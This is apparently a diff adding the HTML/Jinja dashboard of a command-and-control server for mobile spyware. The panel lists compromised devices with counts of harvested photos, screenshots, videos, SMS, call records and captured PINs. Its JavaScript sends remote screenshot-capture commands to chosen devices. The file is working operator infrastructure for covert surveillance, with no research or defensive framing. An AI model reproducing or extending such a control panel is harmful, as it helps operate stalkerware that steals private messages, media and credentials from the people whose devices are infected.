@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Server - Command & Control</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Simple Navigation -->
+        <nav class="navbar">
+            <div class="navbar-brand">
+                <i class="fas fa-skull"></i>
+                <span>C2 Control Panel</span>
+            </div>
+            <div class="navbar-menu">
+                <a href="/" class="active"><i class="fas fa-home"></i> Dashboard</a>
+                <a href="/gallery"><i class="fas fa-images"></i> Gallery</a>
+            </div>
+        </nav>
+
+        <!-- Stats Cards - Only showing clients count -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-title">
+                    <i class="fas fa-mobile-alt"></i> Connected Devices
+                </div>
+                <div class="stat-value">{{ clients|length }}</div>
+            </div>
+        </div>
+
+        <!-- Command Panel - Only screenshot commands -->
+        <div class="command-panel">
+            <h2><i class="fas fa-terminal"></i> Screenshot Commands</h2>
+            <div class="command-form">
+                <div class="form-group">
+                    <label><i class="fas fa-mobile-alt"></i> Select Device</label>
+                    <select id="deviceSelect" class="form-control">
+                        <option value="">Choose a device...</option>
+                        {% for client in clients %}
+                        <option value="{{ ip_to_device_id.get(client, client) }}">
+                            {{ client }} (ID: {{ ip_to_device_id.get(client, 'unknown') }})
+                        </option>
+                        {% endfor %}
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-code"></i> Command</label>
+                    <select id="commandSelect" class="form-control">
+                        <option value="">Select command...</option>
+                        <option value="START_SCREENSHOT">▶️ Start Screenshot Capture</option>
+                        <option value="STOP_SCREENSHOT">⏹️ Stop Screenshot Capture</option>
+                        <option value="CAPTURE_NOW">📸 Capture Single Screenshot</option>
+                    </select>
+                </div>
+                <button class="btn btn-primary" onclick="sendCommand()">
+                    <i class="fas fa-paper-plane"></i> Send Command
+                </button>
+            </div>
+            <div id="commandResult" style="margin-top: 15px;"></div>
+        </div>
+
+        <!-- Clients Grid -->
+        <h2 style="color: white; margin-bottom: 20px;">
+            <i class="fas fa-mobile-alt"></i> Connected Devices ({{ clients|length }})
+        </h2>
+
+        <div class="clients-grid">
+            {% for client in clients %}
+            <div class="client-card">
+                <div class="client-header">
+                    <h3>
+                        <i class="fas fa-{{ 'android' if 'android' in client.lower() else 'laptop' }}"></i>
+                        {{ client }}
+                        <span style="font-size: 0.7em; background: var(--primary); padding: 2px 6px; border-radius: 4px; margin-left: 5px;">
+                            ID: {{ ip_to_device_id.get(client, '?')[:8] }}
+                        </span>
+                    </h3>
+                    <span class="client-status {{ 'online' if client_stats[client].last_seen else 'offline' }}">
+                        {{ 'Active' if client_stats[client].last_seen else 'Inactive' }}
+                    </span>
+                </div>
+                <div class="client-stats">
+                    <div class="client-stat-item">
+                        <div class="label"><i class="fas fa-image"></i> Photos</div>
+                        <div class="value">{{ client_stats[client].photos }}</div>
+                    </div>
+                    <div class="client-stat-item">
+                        <div class="label"><i class="fas fa-camera"></i> Screenshots</div>
+                        <div class="value">{{ client_stats[client].screenshots }}</div>
+                    </div>
+                    <div class="client-stat-item">
+                        <div class="label"><i class="fas fa-video"></i> Videos</div>
+                        <div class="value">{{ client_stats[client].videos }}</div>
+                    </div>
+                    <div class="client-stat-item">
+                        <div class="label"><i class="fas fa-sms"></i> SMS</div>
+                        <div class="value">{{ client_stats[client].sms }}</div>
+                    </div>
+                    <div class="client-stat-item">
+                        <div class="label"><i class="fas fa-phone"></i> Calls</div>
+                        <div class="value">{{ client_stats[client].calls }}</div>
+                    </div>
+                    <div class="client-stat-item">
+                        <div class="label"><i class="fas fa-key"></i> PIN Logs</div>
+                        <div class="value">{{ client_stats[client].pin_logs }}</div>
+                    </div>
+                </div>
+                <div class="client-footer">
+                    <span style="font-size: 0.8em; color: #7f8c8d;">
+                        <i class="far fa-clock"></i> {{ client_stats[client].last_seen or 'No activity' }}
+                    </span>
+                    <div>
+                        <a href="/client/{{ client }}" class="btn btn-sm btn-primary">
+                            <i class="fas fa-eye"></i> View Data
+                        </a>
+                        <button class="btn btn-sm btn-success" onclick="setDevice('{{ ip_to_device_id.get(client, client) }}')">
+                            <i class="fas fa-terminal"></i> Command
+                        </button>
+                    </div>
+                </div>
+            </div>
+            {% else %}
+            <div class="alert alert-warning" style="grid-column: 1/-1;">
+                <i class="fas fa-exclamation-triangle"></i>
+                No devices connected yet. Waiting for data...
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+
+    <!-- Notification Container -->
+    <div id="notificationContainer"></div>
+
+    <script>
+        function sendCommand() {
+            const deviceSelect = document.getElementById('deviceSelect');
+            const deviceId = deviceSelect.value;
+            const command = document.getElementById('commandSelect').value;
+
+            if (!deviceId || !command) {
+                showNotification('warning', 'Please select device and command');
+                return;
+            }
+
+            const commandBtn = document.querySelector('.btn-primary');
+            const originalText = commandBtn.innerHTML;
+            commandBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
+            commandBtn.disabled = true;
+
+            document.getElementById('commandResult').innerHTML =
+                `<div class="alert alert-info">⏳ Sending ${command} to ${deviceId}...</div>`;
+
+            const requestBody = {
+                device_id: deviceId,
+                command: command,
+                params: {}
+            };
+
+            fetch('/commands', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(requestBody)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.command_id) {
+                    document.getElementById('commandResult').innerHTML =
+                        `<div class="alert alert-success">✓ Command ${command} sent! ID: ${data.command_id}</div>`;
+                    showNotification('success', `Command ${command} sent!`);
+                } else {
+                    document.getElementById('commandResult').innerHTML =
+                        `<div class="alert alert-danger">✗ Failed: ${JSON.stringify(data)}</div>`;
+                    showNotification('error', 'Failed to send command');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('commandResult').innerHTML =
+                    `<div class="alert alert-danger">✗ Error: ${error.message}</div>`;
+                showNotification('error', 'Error sending command');
+            })
+            .finally(() => {
+                commandBtn.innerHTML = originalText;
+                commandBtn.disabled = false;
+            });
+        }
+
+        function setDevice(deviceId) {
+            document.getElementById('deviceSelect').value = deviceId;
+            document.getElementById('deviceSelect').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function showNotification(type, message) {
+            const container = document.getElementById('notificationContainer');
+            const notification = document.createElement('div');
+            notification.className = `notification ${type}`;
+            notification.innerHTML = `
+                <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
+                <span>${message}</span>
+                <button class="close-btn" onclick="this.parentElement.remove()">
+                    <i class="fas fa-times"></i>
+                </button>
+            `;
+
+            container.appendChild(notification);
+
+            setTimeout(() => {
+                if (notification.parentElement) {
+                    notification.style.animation = 'slideOut 0.3s ease';
+                    setTimeout(() => notification.remove(), 300);
+                }
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
